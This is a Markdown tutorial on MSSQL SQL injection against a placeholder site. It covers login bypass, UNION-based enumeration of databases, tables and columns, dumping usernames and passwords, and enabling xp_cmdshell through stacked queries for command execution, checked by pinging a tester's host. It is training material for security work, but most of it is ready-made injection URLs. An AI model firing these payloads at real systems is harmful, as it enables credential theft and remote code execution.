# Structured Query Language Injection(SQLi) Training

## Basic SQLi
Structured Query Language(SQL) is the language used in relational databases.  A relational databases is made up of one or more databases, and each database can hold one or more tables under them.  Each table can have multiple columns and each entry in the table is called a row.  The following database example will be used to show how SQLi can be done.  

The following database has the name "Users_db" with one table "Users_tb".  This table has 2 columns "username" and "password" and 2 entry's of the 2 users "Alice" and "Bob".


#### Users_db
##### Users_tb
| username | password |
| --- | --- |
| Alice | is_the_best |
| Bob | Str0ngP@ss! |

We will be using a standard login page for this training. For the login page the logic of the query will be as follows.
```
SELECT * FROM Users_tb WHERE username = '$user' AND password = '$pass'
```

The login.php logic is as follows.
```
if true:
	do welcome.php
	else login.php
```

A login page request is the following.
```
http://insecure-website.com/login.php?user=Alice&pass=is_the_best
```

In this example the webpage does not show any error information and redirects to welcome.php on true statement and redirects to login.php on false statements.

There are many ways to bypass this login page.  First we can remove the second part of the SQL query with a comment and allow us to login if we know the users with the following

```
http://insecure-website.com/login.php?user=Bob'+--
```
Note: Web uses url encoding and a space is encoded as a "+" 

This request would comment out the rest of the code after user and result in the query returning true, user Bob does exist and would redirect to welcome.php 
```
SELECT * FROM Users_tb WHERE username = 'Bob' --' AND password = '$pass'
```

Another method would be to just create a true statement to bypass needing to know who the user is.

```
http://insecure-website.com/login.php?user=jeff'+OR+1=1+--
```

This would create the following query 
```
SELECT * FROM Users_tb WHERE username = 'jeff' OR 1=1 --' AND password = '$pass'
```

This would cause the database to login as the top user in the database "Alice" because the true parameter of 1=1 is supplied as an OR to the username and the rest of the query statement is commented out.


## Advanced SQLi

To show some of the more complicated injections that can be done we will be using a search page as an example.  The following tables are applicable. 

#### Users_db
##### Users_tb
| username | password |
| --- | --- |
| Alice | is_the_best |
| Bob | Str0ngP@ss! |

#### Products_db
##### Products_tb
| gifts | price |
| --- | --- |
| Flowers | 5.99 |
| Chocolates | 2.99 |
| Card | 1.99 |



Products search request.
```
https://insecure-website.com/products.php?gifts=gift
```

Products search request query.
```
SELECT * FROM Products_tb WHERE gifts = '$gift'
```

For this example the products.php will return the product name and price or it will return there was an error in MSSQL query.
```
if true:
	do echo "The $gift costs $price"
	else echo "MSSQL query error"
```

To start we could find the SQLi like last time with 
```
https://insecure-website.com/products.php?gifts=xyz'OR+1=1+--
```

This would return the 3 results of the table.  
```
The Flowers costs 5.99
The Chocolates costs 2.99
The Card costs 1.99
```


The fact that information is displayed can be used to enumerate the underlying Database.

Some basic enumeration that should be done:
 - Injection Columns
 - Database Version
 - Users
 - Databases
 - Tables in Databases
 - Columns in Tables
 - Data in Columns

### Injection Columns

First find the amount of Columns that can be used during the injection.

```
https://insecure-website.com/products.php?gifts=xyz'ORDER+BY+2+--
```

Returns
```
The  costs 
```

Anything above 2 will cause the error page to display because this table is using 2 columns as described in the Products_tb

```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT+'injection',NULL+--
```

Returns
```
The injection costs 
```

If we try to inject into the price field we will get an error because our query does not have an input for the price it only pulls price out of the table to match the gift.

### Database Version

To find the Database version we would use @@version 
```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT+@@version,NULL+--
```

Returns
```
The Microsoft SQL Server 2012 - 11.0.2100.60 (X64) 
	Feb 10 2012 19:39:15 
	Copyright (c) Microsoft Corporation
	Express Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: ) (Hypervisor) costs
```

This information can be used to search any exploits/vulnerabilities in the database itself.

### Users Enumeration

To find the current user and all users do the following respectively.

`SELECT user_name()`
`SELECT name FROM master..syslogins`

This will list the user of the database which will help find the permissions of the user the database is logged in as. 

```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT+name,NULL+FROM+master..syslogins--
```

Returns
```
The sa costs
The hostname\Administrator costs
The BUILTIN\Users costs
The NT AUTHORITY\SYSTEM costs
```

### Databases Enumeration

There is multiple ways to enumerate the db's, the following is one way.
`UNION SELECT DB_NAME(N),NULL--`  
 N = number, 0 is current db, 1+ is db listed in order


```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT DB_NAME(0),NULL+--
```

Returns
```
The Products_db costs
```
This is the current DB the command is run in.

```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT DB_NAME(1),NULL+--
```

Returns
```
The Users_db costs
```
This is the first DB in the DB

```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT DB_NAME(2),NULL+--
```

Returns
```
The Products_db costs
```
This is the second DB in the DB. This is also the current database our query is in.


### Table Enumeration 

To get table name from current database use 
```
UNION SELECT TABLE_NAME,NULL FROM information_schema.TABLES--
```

To get table name from other database use the following replacing "other_database"
```
UNION SELECT name,NULL FROM other_database..sysobjects WHERE xtype = 'U'--
```

For our example we want to get the tables of Users_db

```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT+name,NULL+FROM+Users_db..sysobjects+WHERE+xtype+=+'U'--
```

Returns
```
The Users_tb costs
```

### Column Enumeration

To get column name from current database regardless of table in use 
```
UNION SELECT column_name,NULL FROM information_schema.COLUMNS--
```

To get column name from current database and specified table use the following replacing "table1" with specified table
```
UNION SELECT NULL,name,NULL FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'table1')--
```

To get column name from other database replace "other_database" and "other_table"
```
UNION SELECT other_database..syscolumns.name,NULL FROM other_database..syscolumns, other_database..sysobjects WHERE other_database..syscolumns.id=other_database..sysobjects.id AND other_database..sysobjects.name='other_table'--

```

Final request looks as follows
```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT+Users_db..syscolumns.name,NULL+FROM+Users_db..syscolumns,+Users_db..sysobjects+WHERE+Users_db..syscolumns.id%3dusers_db..sysobjects.id+AND+Users_db..sysobjects.name%3d'Users_tb'--
```

Returns
```
The username costs
The password costs
```


### Dump table

To dump the table of a current database 
```
UNION SELECT NULL,column1,NULL FROM table1--
```

To dump the table from another database
```
UNION SELECT NULL,other_column,NULL FROM other_database..other_table--
```

In MSSQL the "+" or "%2b" after url encoding is used as a concat so we can modify our base dump to pull all the information we need in one field with the following
```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT+username%2b':'%2bpassword,NULL+FROM+Users_db..Users_tb--
```

Returns
```
The Alice:is_the_best costs
The Bob:Str0ngP@ss! costs
```

## SQLi RCE

To execute code on the target server a few things need to be verified.  First verify the ability to execute xp_cmdshell function.  A quick way to do that is using the command `is_srvrolemember('sysadmin')`. If the output of this is 1 then the user has proper credentials to execute xp_cmdshell.

Next if running `exec xp_cmdshell 'ping your_host'` does not return a ping to listening tcpdump  then xp_cmdshell will need to be enabled. This function is disabled by default in MSSQL 2005 or newer. To enable this function multiple commands need to be run, This means sending stacked queries is required.

To see if stacked queries is supported a simple time delay command can be done.`WAITFOR DELAY '0:0:5'` This will wait 5 seconds then return the request, by using a known good command we can just add a `;`  or `%3b`before the comment line and the waitfor command.  This will give us good output but after the delay to verify stacking multiple commands will work.

Once stacked queries have been verified the commands to enable xp_cmdshell are as follows:
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
This command can also be stacked with the ping command to see if code execute is possible.

```
https://insecure-website.com/products.php?gifts=xyz'UNION+SELECT+null,null%3bexec+sp_configure+'show+advanced+options',+1%3bRECONFIGURE%3bexec+sp_configure+'xp_cmdshell',+1%3b+RECONFIGURE%3bexec+xp_cmdshell+'ping+192.168.119.150'--
```

This will return nothing on the web but `tcpdump icmp` will pick up pings from the vulnerable server. 








## References
- http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
- http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html
- https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
- https://portswigger.net/web-security/sql-injection
- https://www.exploit-db.com/papers/12975
